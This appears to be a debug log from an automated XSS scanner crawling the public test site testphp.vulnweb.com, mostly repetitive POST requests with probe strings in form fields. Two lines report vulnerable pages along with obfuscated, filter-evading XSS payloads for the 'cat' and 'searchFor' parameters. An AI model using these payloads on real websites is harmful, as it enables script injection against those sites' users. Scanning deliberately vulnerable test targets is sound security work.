+2024-01-20 21:52:08,656 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:08,656 core.requester - DEBUG - Requester data: {
+  "uname": "st4r7s>3nd"
+}
+2024-01-20 21:52:08,656 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:08,946 modes.crawl - VULN - Vulnerable webpage: [92mhttp://testphp.vulnweb.com/listproducts.php[0m
+2024-01-20 21:52:08,947 modes.crawl - VULN - Vector for [92mcat[0m: <hTMl%0donPOintERENtER%0d=%0dconfirm()%0dx//
+2024-01-20 21:52:08,995 modes.crawl - VULN - Vulnerable webpage: [92mhttp://testphp.vulnweb.com/search.php?test=query[0m
+2024-01-20 21:52:08,996 modes.crawl - VULN - Vector for [92msearchFor[0m: <A/+/onmouSeoVer%0a=%0a(confirm)()>v3dm0s
+2024-01-20 21:52:09,437 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:09,437 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:09,438 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "st4r7s>3nd"
+}
+2024-01-20 21:52:09,438 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:10,860 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:10,860 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:10,861 core.requester - DEBUG - Requester data: {
+  "name": "anonymous user",
+  "submit": "v3dm0s"
+}
+2024-01-20 21:52:10,861 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:10,955 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:10,955 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:10,955 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "v3dm0s"
+}
+2024-01-20 21:52:10,955 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:11,675 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:11,675 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:11,675 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "v3dm0s"
+}
+2024-01-20 21:52:11,676 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:12,486 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:12,486 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:12,487 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "",
+  "goButton": "v3dm0s"
+}
+2024-01-20 21:52:12,487 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:13,396 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:13,396 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:13,396 core.requester - DEBUG - Requester data: {
+  "name": "anonymous user",
+  "submit": "st4r7s<3nd"
+}
+2024-01-20 21:52:13,396 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:13,492 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:13,492 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:13,492 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "st4r7s<3nd"
+}
+2024-01-20 21:52:13,493 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:14,714 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:14,714 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:14,714 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "st4r7s<3nd"
+}
+2024-01-20 21:52:14,714 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:16,118 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:16,118 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:16,118 core.requester - DEBUG - Requester data: {
+  "name": "anonymous user",
+  "submit": "st4r7s>3nd"
+}
+2024-01-20 21:52:16,118 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:16,383 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:16,383 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:16,383 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:16,384 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:16,384 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "st4r7s>3nd"
+}
+2024-01-20 21:52:16,384 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "",
+  "goButton": "st4r7s<3nd"
+}
+2024-01-20 21:52:16,384 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:16,385 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:18,025 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:18,025 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:18,025 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "st4r7s>3nd"
+}
+2024-01-20 21:52:18,025 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:19,239 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:19,239 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:19,240 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "v3dm0s"
+}
+2024-01-20 21:52:19,240 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:20,943 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/userinfo.php
+2024-01-20 21:52:20,943 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:20,943 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "",
+  "searchFor": "",
+  "goButton": "st4r7s>3nd"
+}
+2024-01-20 21:52:20,944 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:21,211 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:21,211 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:21,211 core.requester - DEBUG - Requester data: {
+  "uname": "v3dm0s"
+}
+2024-01-20 21:52:21,211 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:21,757 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:21,757 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:21,757 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "st4r7s<3nd"
+}
+2024-01-20 21:52:21,758 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:23,798 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:23,798 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:23,799 core.requester - DEBUG - Requester data: {
+  "uname": "st4r7s<3nd"
+}
+2024-01-20 21:52:23,799 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:24,314 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:24,314 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:24,314 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "v3dm0s"
+}
+2024-01-20 21:52:24,315 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:24,609 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:24,609 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:24,611 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "st4r7s>3nd"
+}
+2024-01-20 21:52:24,611 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:26,321 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:26,321 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:26,321 core.requester - DEBUG - Requester data: {
+  "uname": "st4r7s>3nd"
+}
+2024-01-20 21:52:26,322 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:26,805 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:26,805 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:26,805 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "st4r7s<3nd"
+}
+2024-01-20 21:52:26,805 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:27,164 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:27,164 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:27,164 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "v3dm0s"
+}
+2024-01-20 21:52:27,165 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:29,330 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:52:29,330 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:29,331 core.requester - DEBUG - Requester data: {
+  "uname": "",
+  "pass": "st4r7s>3nd"
+}
+2024-01-20 21:52:29,331 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:29,705 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:29,705 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:29,705 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "st4r7s<3nd"
+}
+2024-01-20 21:52:29,705 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:32,200 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:32,200 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:32,200 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "st4r7s>3nd"
+}
+2024-01-20 21:52:32,200 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:34,697 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:34,697 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:34,697 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "v3dm0s"
+}
+2024-01-20 21:52:34,698 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:37,222 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:37,222 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:37,222 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "st4r7s<3nd"
+}
+2024-01-20 21:52:37,223 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:39,768 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:39,768 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:39,768 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "st4r7s>3nd"
+}
+2024-01-20 21:52:39,768 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:42,310 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:42,310 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:42,310 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "v3dm0s"
+}
+2024-01-20 21:52:42,310 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:44,830 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:44,830 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:44,830 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "st4r7s<3nd"
+}
+2024-01-20 21:52:44,831 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:47,362 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:47,362 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:47,362 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "st4r7s>3nd"
+}
+2024-01-20 21:52:47,362 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:49,862 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:49,862 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:49,862 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "v3dm0s"
+}
+2024-01-20 21:52:49,862 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:52:52,389 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/secured/newuser.php
+2024-01-20 21:52:52,389 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:52:52,389 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "st4r7s<3nd"
+}
+2024-01-20 21:52:52,390 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
